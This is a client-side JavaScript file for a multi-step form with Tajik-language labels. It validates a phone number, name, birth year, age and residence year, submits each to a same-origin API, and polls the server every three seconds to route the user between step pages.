const step = document.body.dataset.step;
const statusMessage = document.getElementById("statusMessage");
const submitButton = document.getElementById("submitStepButton");
const fieldError = document.getElementById("fieldError");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");
const routeByStatus = {
  phone: "/phone.html",
  waiting: "/waiting.html",
  name: "/name.html",
  birth_year: "/birth-year.html",
  age: "/age.html",
  residence_year: "/residence-year.html",
  approved: "/approved.html"
};

let pollHandle = null;

const setStatus = (message, type = "") => {
  if (!statusMessage) return;
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (fieldError) {
    fieldError.textContent = message;
  }
};

const setButtonState = (isReady, label = "Ирсол кардан") => {
  if (!submitButton) return;
  submitButton.textContent = label;
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validateStepValue = (value) => {
  const text = String(value || "").trim();

  if (!text) {
    setFieldError("");
    return false;
  }

  if (step === "name") {
    if (text.length < 2) {
      setFieldError("Ном бояд ҳадди ақал 2 ҳарф дошта бошад.");
      return false;
    }

    setFieldError("");
    return true;
  }

  const digits = text.replace(/\D/g, "");

  if (!digits.length) {
    setFieldError("Лутфан рақам ворид кунед.");
    return false;
  }

  setFieldError("");
  return true;
};

const redirectToStatus = (status, currentClientId) => {
  const page = routeByStatus[status];
  if (!page) return;

  const target = `${page}?client=${currentClientId}`;
  const current = `${window.location.pathname}${window.location.search}`;
  if (current !== target) {
    window.location.replace(target);
  }
};

const loadClient = async () => {
  if (!clientId) {
    window.location.replace("/");
    return null;
  }

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) {
    window.location.replace("/");
    return null;
  }

  if (data.client.status !== step) {
    redirectToStatus(data.client.status, clientId);
    return null;
  }

  if (data.client.currentError && step !== "waiting") {
    setStatus(data.client.currentError, "error");
  }

  const field = document.getElementById("stepValue");
  if (field) {
    const savedValue = data.client.submissions?.[step]?.value;
    if (savedValue && !field.value) {
      field.value = savedValue;
    }
    setButtonState(validateStepValue(field.value));
  }

  return data.client;
};

const prepareInputMasks = () => {
  const field = document.getElementById("stepValue");
  if (!field) return;

  if (step === "name") {
    field.addEventListener("input", () => {
      field.value = field.value.replace(/\s+/g, " ").replace(/^\s+/, "");
      setButtonState(validateStepValue(field.value));
    });
    return;
  }

  field.addEventListener("input", () => {
    field.value = field.value.replace(/\D/g, "");
    setButtonState(validateStepValue(field.value));
  });
};

const handleSubmit = async (event) => {
  event.preventDefault();

  const field = document.getElementById("stepValue");
  const value = field ? field.value.trim() : "";
  if (!validateStepValue(value)) {
    setStatus("Лутфан маълумотро пур кунед.", "error");
    return;
  }

  setButtonState(false, "Фиристода истодааст...");
  setStatus("Маълумот фиристода шуда истодааст...");

  try {
    const response = await fetch(`/api/client/${clientId}/submit-step`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ step, value })
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Ирсол муваффақ нашуд. Бори дигар кӯшиш кунед.", "error");
    setButtonState(validateStepValue(value));
  }
};

const init = async () => {
  if (submitButton) {
    setButtonState(false);
  }

  await loadClient();
  prepareInputMasks();

  const form = document.getElementById("stepForm");
  if (form && submitButton) {
    form.addEventListener("submit", handleSubmit);
  }

  pollHandle = setInterval(loadClient, 3000);
};

window.addEventListener("beforeunload", () => {
  if (pollHandle) clearInterval(pollHandle);
});

init();
